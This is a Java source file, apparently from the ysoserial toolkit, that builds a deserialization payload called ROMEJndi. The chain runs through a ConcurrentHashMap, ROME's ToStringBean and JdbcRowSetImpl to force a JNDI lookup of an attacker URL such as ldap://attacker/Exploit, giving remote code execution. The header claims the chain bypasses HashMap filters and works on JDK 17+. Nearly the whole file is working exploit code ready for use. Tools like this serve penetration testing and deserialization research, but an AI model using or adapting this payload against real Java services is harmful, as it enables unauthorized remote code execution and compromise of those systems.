package ysoserial.payloads;

import java.lang.reflect.Field;
import java.util.concurrent.ConcurrentHashMap;

import javax.xml.transform.Templates;

import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME + JNDI sink — no TemplatesImpl needed. Works on JDK 17+.

	Gadget chain:
		ObjectInputStream.readObject()
			ConcurrentHashMap.readObject()
				ConcurrentHashMap.putVal()
					ObjectBean.hashCode()
						EqualsBean.beanHashCode()
							ToStringBean.toString()
								JdbcRowSetImpl.getDatabaseMetaData()
									JdbcRowSetImpl.connect()
										InitialContext.lookup(dataSourceName)
											→ JNDI RCE

	Combines:
		- ConcurrentHashMap entry (bypasses HashMap filters)
		- ROME ToStringBean (getter invocation via reflection)
		- JdbcRowSetImpl JNDI sink (no TemplatesImpl, no module opens)

	Usage: payload arg is JNDI URL (ldap://attacker/Exploit, rmi://attacker/Exploit)

	Requires:
		rome 1.0 (ObjectBean, ToStringBean)
		JDK (JdbcRowSetImpl — com.sun.rowset)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies("rome:rome:1.0")
@Authors({ Authors.MBECHLER })
public class ROMEJndi extends PayloadRunner implements ObjectPayload<ConcurrentHashMap> {

	public ConcurrentHashMap getObject(final String jndiUrl) throws Exception {
		// JdbcRowSetImpl: setDataSourceName() → connect() → InitialContext.lookup()
		final JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
		jdbcRowSet.setDataSourceName(jndiUrl);
		// Initialize match columns to prevent NPE during serialization
		Reflections.setFieldValue(jdbcRowSet, "iMatchColumns",
			new java.util.Vector<Integer>(java.util.Arrays.asList(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1)));
		Reflections.setFieldValue(jdbcRowSet, "strMatchColumns",
			new java.util.Vector<String>(java.util.Arrays.asList("","","","","","","","","","")));

		// ToStringBean calls all getters on the wrapped object
		// getDatabaseMetaData() triggers connect() → JNDI lookup
		final ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);
		final ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);

		ConcurrentHashMap<Object, Object> chm = new ConcurrentHashMap<Object, Object>(1);
		chm.put("dummy", "dummy");

		Field tableField = ConcurrentHashMap.class.getDeclaredField("table");
		Reflections.setAccessible(tableField);
		Object[] table = (Object[]) tableField.get(chm);

		for (int i = 0; i < table.length; i++) {
			if (table[i] != null) {
				Field keyField = table[i].getClass().getDeclaredField("key");
				Reflections.setAccessible(keyField);
				keyField.set(table[i], objectBean);
				break;
			}
		}

		return chm;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROMEJndi.class, args);
	}
}
